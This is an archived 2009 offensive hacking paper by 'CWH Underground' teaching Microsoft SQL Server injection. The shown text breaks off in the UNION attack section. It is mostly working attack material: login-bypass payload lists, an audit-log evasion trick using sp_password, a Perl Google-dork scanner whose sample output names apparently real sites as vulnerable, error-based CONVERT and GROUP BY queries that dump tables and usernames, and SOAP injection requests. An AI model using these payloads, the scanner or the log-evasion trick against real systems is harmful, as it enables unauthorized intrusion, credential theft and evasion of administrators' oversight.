# MSSQL_Injection_PWNage

Full MSSQL Injection PWNage
Archived security papers and articles in various languages.

		|=--------------------------------------------------------------------=|
		|=----------------=[  Full MSSQL Injection PWNage  ]=-----------------=|
		|=-----------------------=[ 28 January 2009 ]=------------------------=|
		|=---------------------=[  By CWH Underground  ]=---------------------=|
		|=--------------------------------------------------------------------=|
				
######
 Info
######

Title	: Full MSSQL Injection PWNage
Author	: ZeQ3uL && JabAv0C
Team    : CWH Underground [www.milw0rm.com/author/1456]
Website	: cwh.citec.us / www.citec.us
Date	: 2009-01-28


##########
 Contents
##########

  [0x00] - Introduction

  [0x01] - Know the Basic of SQL injection

	[0x01a] - Introduction to SQL Injection Attack
	[0x01b] - How to Test sites that are Vulnerable in SQL Injection
	[0x01c] - Bypass Authentication with SQL Injection
	[0x01d] - Audit Log Evasion
	[0x01e] - (Perl Script) SQL-Google searching vulnerable sites 

  [0x02] - MSSQL Normal SQL Injection Attack
	
	[0x02a] - ODBC Error Message Attack with "HAVING" and "GROUP BY"
	[0x02b] - ODBC Error Message Attack with "CONVERT"
	[0x02c] - MSSQL Injection with UNION Attack
	[0x02d] - MSSQL Injection in Web Services (SOAP Injection)

  [0x03] - MSSQL Blind SQL Injection Attack
	
	[0x03a] - How to Test sites that are Vulnerable in Blind SQL Injection
	[0x03b] - Determine data through Blind SQL Injection
	[0x03c] - Exploit Query for get Table name 
	[0x03d] - Exploit Query for get Column name

  [0x04] - More Dangerous SQL Injection Attack

	[0x04a] - Dangerous from Extended Stored Procedures
	[0x04b] - Advanced SQL Injection Techniques
	[0x04c] - Mass MSSQL Injection Worms

  [0x05] - MSSQL Injection Cheat Sheet

  [0x06] - SQL Injection Countermeasures

  [0x07] - References

  [0x08] - Greetz To


#######################
 [0x00] - Introduction
#######################

	Welcome reader, this paper is a short attempt at documenting a practical technique 
we have been working on. This papers will guide about technique that allows the attackers 
(us) gaining access into the process of exploiting a website via SQL Injection Techniques
that we focused on MSSQL only

	This paper is divided into 8 sections but only from section 0x01 to 0x06
are about technical information.

	Section 0x01, we talk about basic knowledge of SQL injection vulnverabilities which
are classified into two types, normal and blind. Section 0x02, we give a detail of each way 
attacking through SQL injection. Section 0x03, we explain the way to enumerate data through 
blind sql injection technique. Section 0x04, we show more dangerous approaches which can occur 
through SQL injection vulnerabilities. Section 0x05, we collect MSSQL queries in several purposes.
Section 0x06, we offer some tips in order to prevent the system from SQL injection attack.


##########################################
 [0x01] - Know the Basic of SQL injection
##########################################
	
	SQL injection vulnerabilities occur when the database server can be made to execute arbitrary SQL 
(Structured Query Language) commands. Typically executed through the web application front end (use interface,
form, etc.), the attack involves entering malformed or unexpected SQL statements which result in unauthorized
execution of SQL commands on the database server.  


	++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x01a] - Introduction to SQL Injection Attack
	++++++++++++++++++++++++++++++++++++++++++++++++
	
		SQL injection attacks occur when malicious SQL commands are injected into a predefined SQL query 
	in order to alter the outcome of the query. Take the example of an application that requests a user id 
	for authentication. The application adds this user ID to a predefined SQL query to perform authentication. 
	
		However, if instead of providing a valid user name the attacker inputs a specialized SQL command 
	that forces the termination of the predefined SQL query and forces the execution of a new SQL query. In this 
	way the attacker can execute any SQL command on the host system without even needing to log in. 
	
		A successful SQL injection exploit can read sensitive data from the database, modify database data 
	(Insert/Update/Delete), execute administration operations on the database (such shutdown the DBMS), recover 
	the content of a given file present on the DBMS filesystem and in some cases issue commands to the operating system. 
	
		An application is vulnerable to SQL injection attack when:
			- User input is incorrectly filtered for string literal escape characters embedded in SQL statements.
			- User input is either not restricted ? e.g. through strong typing - and thereby can be made to execute
			  in an unexpected manner
	
		SQL Injection always occur in application that needs to talk to a Database include:
			- Authentication forms (Login Pages)
			- Search forms
			- E-Commerce sites
			- Forum / Webboard
			- Content Manage System (CMS's that use DB),Such as: 
				Joomla Components (http://www.milw0rm.com/search.php?dong=joomla)
				Mambo Components (http://www.milw0rm.com/search.php?dong=mambo)
				Wordpress Plugin (http://www.milw0rm.com/search.php?dong=wordpress)

	
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x01b] - How to Test sites that are vulnerable in SQL Injection
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	
		We must make a list of all input fields whose values could be used in crafting a SQL query, 
	including the hidden fields of POST requests and then test them separately, trying to interfere with 
	the query and to generate an error. The very first test usually consists of adding a single quote (') 
	, double quote ("") or a semicolon (;) to the field under test. 
	
	[Simple URL] http://www.example.com/news.asp?id=10
	[Test SQLi]  http://www.example.com/news.asp?id=10'

		It's vulnerable in SQL injection,If the output some error like this:
	
	[HTTP Response]-----------------------------------------------------------------------------
	Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
	[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the 
	character string ''.
	/news.asp, line 52
	[End HTTP Response]-------------------------------------------------------------------------

		Next solution, Use "OR/AND" Operation for testing SQL injection vulnerability:
 
		If contains is the different as original URL that dump all data 
	from database, It's vulnerable in SQL injection.

	[Simple URL] http://www.example.com/news.asp?id=2

	[output]------------------------------------------------------------------------------------
	News: 2
	Details: Preventing blind SQL injection attacks, Most security professionals know ... 
	[End Output]--------------------------------------------------------------------------------


	[Test SQLi] http://www.example.com/news.asp?id=2' or '1'='1

	[output]------------------------------------------------------------------------------------
	News: 1
	Details: SQL injection attack infects hundreds of thousands of websites ...

	News: 2
	Details: Preventing blind SQL injection attacks, Most security professionals know ... 
	
	News: 3
	Details: Mass SQL injection, There's another round of mass SQL injections going on which has infected ...
	
	News: 4
	Details: New Botnet Malware Spreading SQL injection attack tool ...
	[End Output]--------------------------------------------------------------------------------

		That's Great !! Can you see something different from original URL ? (It's Vuln in SQL Injection Attacks),
	It's return all query from DB, Why ??

	[ASP_code]
	var sql = "SELECT * FROM news WHERE id = '" + getid +"'";
	[End ASP_code]

	[Final query //id=2]
	SELECT * FROM news WHERE id = '2'		// It's will return News 2
	[End id=2]

	[Final query //id=2' or 'a'='a]			// Testing SQLi Vuln
	SELECT * FROM news WHERE id = '2' or 'a'='a'	// It's include ' or 'a'='a into SQL statement and the condition is TRUE,
							//  So It will return all news (id=1,2,3,...)
	[End id=2' or 'a'='a]



	++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x01c] - Bypass Authentication with SQL Injection
	++++++++++++++++++++++++++++++++++++++++++++++++++++

		This basic technique for "bypass Login" when application use DB to checking authentication.
	However, an attacker may possibly bypass this check with SQL injection.
	
	[Example scripts]

	+-----------------------------+
	|	  ' or 1=1 --	      |
	|	  a' or 1=1 --	      |
	|	  " or 1=1 --	      |
	|	  a" or 1=1 --	      |
	|	  ' or 1=1 #	      |
	|	  " or 1=1 #	      |
	|	  or 1=1 --	      |
	|	  ' or 'x'='x	      |
	|	  " or "x"="x	      |
	|	  ') or ('x'='x	      |
	|	  ") or ("x"="x	      |
	| ' or username LIKE '%admin% |
	+-----------------------------+
	|      USERNAME:  ' or 1/*    |
	|      PASSWORD:  */ =1 --    |
	+-----------------------------+
	|  USERNAME: admin' or 'a'='a |
	|  PASSWORD: '#		      |
	+-----------------------------+

	[Login ASP_code]----------------------------------------------------------------------------
	var sql = "SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";
	[End Login ASP_code]------------------------------------------------------------------------

		When we input something like this:
		formusr = admin
		formpwd = ' or 'a='a

	[SQL Query]---------------------------------------------------------------------------------
	SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'
	[End Code]----------------------------------------------------------------------------------

		This SQL condition is TRUE and bypass login process, So you don't need admin's password. (Just use ' or 'a'='a)

		If we input something like this
		formusr = ' or 1=1 -- 
		formpwd = anything
	
	[SQL Query]---------------------------------------------------------------------------------
	SELECT * FROM users WHERE username = '' or 1=1 -- AND password = 'anything'
	[End Code]----------------------------------------------------------------------------------

		** Note **

		--		is comment operator of MSSQL DB used to comment out everything following this operator.
		/*Comment*/	Inline comment, Comments out rest of the query by not closing them / Bypass blacklisting.
				
				DROP/*comment*/sampletable 
				DR/**/OP/*bypass blacklisting*/sampletable 
				SELECT/*avoid-spaces*/password/**/FROM/**/Members


		If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then
	you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash 
	of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.
		
		formusr = admin 
		formpwd = pass ' AND 1=2 UNION ALL SELECT 'admin', '1a1dc91c907325c69271ddf0c944bc72

	1a1dc91c907325c69271ddf0c944bc72 = MD(pass)

	+++++++++++++++++++++++++++++
	 [0x01d] - Audit Log Evasion
	+++++++++++++++++++++++++++++

		When we injection some code with SQLi Techniques, All of the SQL queries can be logged and admin can know what's happen ?
	The technique for evade logging, We use "sp_password"

		formusr = ' or 1=1 -- sp_password
		formpwd = anything

		SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries 
	it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible).

	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x01e] - (Perl Script) SQL-Google searching vulnerable sites
	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	
		The Good way to searching sites that have SQL injection vulnerability is "Google" 
	(That powerful to use every search engines to searching with IRCbots). We developed simple Perl script for
	searching SQL injection holes (MSSQL, Mysql, MS Access, Oracle) name "SQL-Google Search":

	[code]-----------------------------------------------------------------------------------

	#!/usr/bin/perl
	use LWP::Simple;
	use LWP::UserAgent;
	use HTTP::Request;
	my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); } 
	print "+++++++++++++++++++++++++++++++\n";
	print "+     SQL - Google Search     +\n";
	print "+       CWH Underground       +\n";
	print "+++++++++++++++++++++++++++++++\n\n";
	print "Insert Dork:";
	chomp( my $dork = <STDIN> );
	print "Total Query Pages (10 Links/Pages) :";
	chomp( my $page = <STDIN> );
	print "\n[+] Result:\n\n";
	for($start = 0;$start != $page*10;$start += 10)
	{	
	$t = "http://www.google.com/search?hl=en&q=".$dork."&btnG=Search&start=".$start;
	    $ua = LWP::UserAgent->new(agent => 'Mozilla 5.2');
	    $ua->timeout(10);
	    $ua->env_proxy;
	    $response = $ua->get($t);
	    if ($response->is_success)
	    {
	        $c = $response->content;
	        @stuff = split(/<a href=/,$c);
	        foreach $line(@stuff)
	        {
	            if($line =~/(.*) class=l/ig)
	            {
	                $out = $1;
	                $out =~ s/\"//g;
			$out =~s/$/\'/;    
			$ua = LWP::UserAgent->new(agent => 'Mozilla 5.2');
			$ua->timeout(10);
			$ua->env_proxy;
			$response = $ua->get($out);
			$error = $response->content();
			if($error =~m/mysql_/ || $error =~m/Division by zero in/ || $error =~m/Warning:/)
				{print "$out => Could be Vulnerable in MySQL Injection!!\n";}
			elsif($error =~m/Microsoft JET Database/ || $error =~m/ODBC Microsoft Access Driver/)
				{print "$out => Could be Vulnerable in MS Access Injection!!\n";}
			elsif($error =~m/Microsoft OLE DB Provider for SQL Server/ || $error =~m/Unclosed quotation mark/)
				{print "$out => Could be Vulnerable in MSSQL Injection!!\n";}
			elsif($error =~m/Microsoft OLE DB Provider for Oracle/)
				{print "$out => Could be Vulnerable in Oracle Injection!!\n";}
		    }
		}
	    }
        }

	[End code]----------------------------------------------------------------------------------
	
	[output]------------------------------------------------------------------------------------
	
	+++++++++++++++++++++++++++++++
	+     SQL - Google Search     +
	+       CWH Underground       +
	+++++++++++++++++++++++++++++++

	Insert Dork:index.asp?sid=
	Total Query Pages (10 Links/Pages) :5

	[+] Result:

	http://www.ris.org.uk/index.asp?sid=7&mid=5' => Could be Vulnerable in MSSQL Injection!!
	http://www.waterbucket.ca/rm/index.asp?type=single&sid=44&id=307' => Could be Vulnerable in MSSQL Injection!!
	http://www.ilri.org/research/Index.asp?SID=4' => Could be Vulnerable in MSSQL Injection!!
	
	[End output]--------------------------------------------------------------------------------


############################################
 [0x02] - MSSQL Normal SQL Injection Attack
############################################

	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x02a] - ODBC Error Message Attack with "HAVING" and "GROUP BY"
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		
		We can use information from error message produced by the MS SQL Server to get almost any data we want. 
	
	- "GROUP BY" is a microsoft sql server command used to group output of particular sql query.
	- "HAVING" is a command used to specify a search condition for a group or an aggregate. 
	  this command is always used with "GROUP BY" otherwise the error will return.

		As the operation of these two commands, we can take advantage of them in order to 
	obtain particular table name and all column names of this table. We will explain you by using an example.

		First, The target has a table called "news" and in news, there are three columns, which are news_id, news_author and news_detail.
	
	The vulnerable page is http://www.example.com/page.asp?id=1
	The query in this page is something like 

		[Query]-----------------------------------------------------------------------------
		var query = "SELECT * FROM news WHERE news_id= '" + column+ "'";
		[End query]-------------------------------------------------------------------------

	So, we can inject HAVING command in order to observe returned error
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1' HAVING 1=1--
		[End SQLi]--------------------------------------------------------------------------

	The query will be 

		SELECT * FROM news WHERE news_id='1' HAVING 1=1--'

	We will get the error as following:
		
		------------------------------------------------------------------------------------
		Microsoft OLE DB Provider for SQL Server error '80040e14'
		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_id' is invalid in 
		the select list because it is not contained in an aggreate function and there is no GROUP BY clause. 
		------------------------------------------------------------------------------------

	In this error, we know table name = "news", used in this page and 
	one column name = "news_id", contained in particular table.
	
	The error is originate from using HAVING command without GROUP BY command. 
	Moreover, we can get the other column names by using combination of GROUP BY and HAVING command.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
		[End SQLi]--------------------------------------------------------------------------

	The query will be

		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id HAVING 1=1--'

	We will get the error
		
		------------------------------------------------------------------------------------
		Microsoft OLE DB Provider for SQL Server error '80040e14'
		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_author' is invalid in 
		the select list because it is not contained in an aggreate function and there is no GROUP BY clause.
		------------------------------------------------------------------------------------

	Now, we know the second column name of table1 = "news_author". The third column name can be obtained 
	by adding the second column name in the previous query
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
		[End SQLi]--------------------------------------------------------------------------

	The query will be

		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id,news.news_author HAVING 1=1--'

	The request will generate following error
		
		------------------------------------------------------------------------------------
		Microsoft OLE DB Provider for SQL Server error '80040e14'
		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_detail' is invalid in 
		the select list because it is not contained in an aggreate function and there is no GROUP BY clause.
		------------------------------------------------------------------------------------

	The third column name = "news_detail", pops up in returned error. If we had more columns, 
	we could add news_detail in GROUP BY clause of previous request then we could get the forth column name.

	When we added all of column in GROUP BY clause, we will get normal result and
	we absolutely know that we obtained all column name in table1.

	As this example, the request below will generate no error.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author,news_detail HAVING 1=1--
		[End SQLi]--------------------------------------------------------------------------

	The query will be

		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id,news.news_author,news_detail HAVING 1=1--'

	As no error return, we know that table1 consists of three columns which are "news_id", "news_author" and "news_detail".


	++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x02b] - ODBC Error Message Attack with "CONVERT"
	++++++++++++++++++++++++++++++++++++++++++++++++++++

		In our opinion, MSSQL expresses much information in returned error. It is useful for programmers to debug their application meanwhile 
	it is valuable for many attackers, as seeing in previous section.

		In this section, we provide another method of utilizing from MSSQL error through a command called "convert".
	convert command is used to convert between two data type and when the specific data cannot convert to another type, 
	this command will return error. let see through an example:

	In this example, we show you how to obtain MSSQL_Version, DB_name, User_name.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
		[End SQLi]--------------------------------------------------------------------------
	
	Error Message returned:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) Feb 9 2007 
		22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Express Edition on Windows NT 5.2 (Build 3790: Service Pack 1) 
		' to data type int.
		/page.asp, line 9 
		------------------------------------------------------------------------------------
	
	Now, We know the version of MSSQL and OS (Windows 2003 Server), Let's go to enumerate DB_name.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
		[End SQLi]--------------------------------------------------------------------------
	
	Error Message returned:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'cwhdb' to data type int.
		/page.asp, line 9
		------------------------------------------------------------------------------------

	We can know the Database name = "cwhdb", Next is query for get current user that run DB.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--
		[End SQLi]--------------------------------------------------------------------------

	Error Message returned:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'sa' to data type int.
		/showthread.asp, line 9
		------------------------------------------------------------------------------------

	W00t!! W00t!!, It use "sa" privileges lol. This information can help us that we can use extended 
	stored procedure "XP_CMDSHELL" to run arbitrary command executes.


	In next example, we show you how to obtain table names, column names and data.

	Take a look at our First request
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))--
		[End SQLi]--------------------------------------------------------------------------

	"information_schema.tables" stores information about tables in databases and there is a field called "table_name" 
	which stores names of each table. The result of this request is something like this:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'threads' to data type int.
		/page.asp, line 9 
		------------------------------------------------------------------------------------

		From the query, we get threads as a nvarchar data type and as it cannot convert from threads to int data type, the error is returned.
	Therefore, we know the first table = "threads", from this error. The next step is looking for the second table. 
	We only put WHERE clause append the query in above request.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+
		not+in+('threads')))--
		[End SQLi]--------------------------------------------------------------------------

	We will get an error like this:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'users' to data type int.
		/page.asp, line 9 
		------------------------------------------------------------------------------------

	Again, we know the second table = "users", from the error. If we want another table, we just append our known table list. for example,
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+
		not+in+('threads','users')))--
		[End SQLi]--------------------------------------------------------------------------

	And we will get an error:

		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'forums' to data type int.
		/page.asp, line 9
		------------------------------------------------------------------------------------

	This means the third table = "forums". On the other hand, if the previous request return something like this.
		
		------------------------------------------------------------------------------------
		ADODB.Field error '800a0bcd'
		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.
		/page.asp, line 10
		------------------------------------------------------------------------------------

	It means this database consists of only two tables, threads and users.

		OK, now, we already get all tables. The next target is column names.
	The method to retrieve column names is not much different from getting table names.
	We merely change from "information_schema.tables" to "information_schema.columns" and from "table_name" to "column_name"
	but we have to add "table_name" in WHERE cluase in order to specify the table which we will pull column names from.

	Don't talk too much, let see an example
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'))--
		[End SQLi]--------------------------------------------------------------------------

	From this request, we get an following error
	
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'uname' to data type int.
		/showthread.asp, line 9 
		------------------------------------------------------------------------------------

	As the same approach of getting table names, we abruptly know that the first column of table 'users' is "uname".
	For another column name, we add a bit in WHERE clause.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+
		and+column_name+not+in+('uname')))--
		[End SQLi]--------------------------------------------------------------------------

	We will get an below error.
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'upass' to data type int.
		/showthread.asp, line 9 
		------------------------------------------------------------------------------------

	Absolutely we know the second column = "upass", of table 'users'. For getting more column names, 
	we only append a known table list like that in getting table names. For example,
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+
		and+column_name+not+in+('uname','upass')))--
		[End SQLi]--------------------------------------------------------------------------

	The Error message:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'email' to data type int.
		/showthread.asp, line 9 
		------------------------------------------------------------------------------------

	So, the third column is "email". but if the error is
		
		------------------------------------------------------------------------------------
		ADODB.Field error '800a0bcd'
		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.
		/page.asp, line 10 
		------------------------------------------------------------------------------------

	This means no more column left. Next is the real target which attackers want, the data.
	If take a look carefully, we will see that the idea is not different from getting table and column.
	Use the same manner but change only table and column name.

	If we want uname data in table users, we can do like this:
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users))--
		[End SQLi]--------------------------------------------------------------------------

	We will see uname in returned error.
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'admin' to data type int.
		/page.asp, line 9 
		------------------------------------------------------------------------------------

	Now, we know that there is 'admin' in column 'uname' of table 'users'. For another uname, 
	we just create a known table list as table and column.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin')))--
		[End SQLi]--------------------------------------------------------------------------

	Error again:
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e07'
		Conversion failed when converting the nvarchar value 'cwh' to data type int.
		/page.asp, line 9
		------------------------------------------------------------------------------------

	OK, we get another "uname" which is 'cwh'. If we try following request.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin','cwh')))--
		[End SQLi]--------------------------------------------------------------------------

	And we get an error like this

		------------------------------------------------------------------------------------
		ADODB.Field error '800a0bcd'
		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.
		/showthread.asp, line 10 
		------------------------------------------------------------------------------------

	It means there are only two uname in users table (admin,cwh).
	

	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	[0x02d] - MSSQL Injection in Web Services (SOAP Injection)
	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		
		Web Services use XML messages that follow the SOAP standard and have been popular with traditional enterprise. 
	In such systems, there is often a machine-readable description of the operations offered by the service written in the 
	Web Services Description Language (WSDL). 
		SOAP is often used in large-scale enterprise applications where individual tasks are performed by different computers to 
	improve performance. It's often found where web application that deployed as a front-end to an existing application.

			Let's take a look for SOAP request like this:
	
		[SOAP Request]------------------------------------------------------------------------------

		POST /webservice/service.asmx HTTP/1.0
		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)
		Content-Type: text/xml; charset=utf-8
		SOAPAction: "http://tempuri.org/GetUserInfo"
		Host: testcwh.cwh.net
		Content-Length: 345
		Expect: 100-continue
		Connection: Keep-Alive
	
		<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body>
		<GetUserInfo xmlns="http://tempuri.org/"><username>admin</username><password>1234</password></GetUserInfo></soap:Body></soap:Envelope>
		
		[End Request]-------------------------------------------------------------------------------
	
			Can you see username(admin) and password(1234) that send to Server side ?

			What's happen if we injection (') single quote to username field like this: <username>admin'</username><password>1234</password>
		before It send to Server Side. We can use Web proxy (Burpsuite, Paros proxy) to intercept SOAP request and SOAP respond.

		[SOAP Respond When we inject single quote]--------------------------------------------------
	
		HTTP/1.1 200 OK
		Date: Mon, 26 Jan 2009 15:45:27 GMT
		Server: Microsoft-IIS/6.0
		X-Powered-By: ASP.NET
		X-AspNet-Version: 2.0.50727
		Cache-Control: private, max-age=0
		Content-Type: text/xml; charset=utf-8
		Content-Length: 1057
		Connection: close
		X-Junk: xxxxxxxxxxx
	
		<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body>
		<GetUserInfoResponse xmlns="http://tempuri.org/"><GetUserInfoResult><ErrorOccured>true</ErrorOccured><ErrorStr>
		System.Data.OleDb.OleDbException: Unclosed quotation mark after the character string ''.
		Incorrect syntax near '81'.
		   at System.Data.OleDb.OleDbDataReader.ProcessResults(OleDbHResult hr)
		   at System.Data.OleDb.OleDbDataReader.NextResult()
		   at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method)
		   at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior)
		   at Service.GetUserInfo(String username, String password)</ErrorStr><SqlQuery>SELECT * FROM users WHERE username='admin'' 
		   AND password='81dc9bdb52d04dc20036dbd8313ed055'</SqlQuery><id>-1</id><joindate>0001-01-01T00:00:00</joindate></GetUserInfoResult>
		   </GetUserInfoResponse></soap:Body></soap:Envelope>
		
		[End Respond]-------------------------------------------------------------------------------
	
		Okey, The SOAP respond return error message like that. We can use simple techiques for SQLi that we showed you 
		in section [0x02b] - ODBC Error Message Attack with "CONVERT", Let's use this SQLi: 
		
			admin' and 1=convert(int,@@version)--
	
		[SOAP Request/Respond]----------------------------------------------------------------------
		
		*** Request ***
		POST /webservice/service.asmx HTTP/1.0
		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)
		Content-Type: text/xml; charset=utf-8
		SOAPAction: "http://tempuri.org/GetUserInfo"
		Host: testcwh.cwh.net
		Content-Length: 384
		
		<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body>
		<GetUserInfo xmlns="http://tempuri.org/"><username>admin' and 1=convert(int,@@version)--</username><password>1234</password>
		</GetUserInfo></soap:Body></soap:Envelope>
		
		
		*** Response ***
		HTTP/1.1 200 OK
		Date: Wed, 28 Jan 2009 15:59:17 GMT
		Server: Microsoft-IIS/6.0
		X-Powered-By: ASP.NET
		X-AspNet-Version: 2.0.50727
		Cache-Control: private, max-age=0
		Content-Type: text/xml; charset=utf-8
		Content-Length: 1266
		Connection: close
		X-Junk: xxxxxxxxxxx
		
		<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body>
		<GetUserInfoResponse xmlns="http://tempuri.org/"><GetUserInfoResult><ErrorOccured>true</ErrorOccured><ErrorStr>
		System.Data.OleDb.OleDbException: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
		Feb  9 2007 22:47:07 
		Copyright (c) 1988-2005 Microsoft Corporation
		Express Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
		' to data type int.
		at System.Data.OleDb.OleDbDataReader.ProcessResults(OleDbHResult hr)
		at System.Data.OleDb.OleDbDataReader.NextResult()
		at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method)
		at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior)
		at Service.GetUserInfo(String username, String password)</ErrorStr><SqlQuery>SELECT * FROM users WHERE username='admin' 
		and 1=convert(int,@@version)--' AND password='81dc9bdb52d04dc20036dbd8313ed055'</SqlQuery><id>-1</id><joindate>0001-01-01T00:00:00</joindate>
		</GetUserInfoResult></GetUserInfoResponse></soap:Body></soap:Envelope>
	
		[End]---------------------------------------------------------------------------------------
	
			W00t!! W00t!!, We can enumerate MSSQL Version : Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86).
		Then we can use SQLi techniques that we mention above (Dump tables, columns, data, Etc).

	++++++++++++++++++++++++++++++++++++++++++++++
	 [0x02c] - MSSQL Injection with UNION Attack
	++++++++++++++++++++++++++++++++++++++++++++++

		This method differs from the both previous methods because we do not get information through error 
	but we, instead, see it in some point of returned page.

	First of all, we have to know the exact number of selected column. We can find it by using ORDER BY clause.

		http://www.example.com/page.asp?id=1 order by 1--
		http://www.example.com/page.asp?id=1 order by 2--
		http://www.example.com/page.asp?id=1 order by 3--
		http://www.example.com/page.asp?id=1 order by 4--
		and so on

	We observe a result from each request until we get error like this.
		
		------------------------------------------------------------------------------------
		Microsoft SQL Native Client error '80040e14'
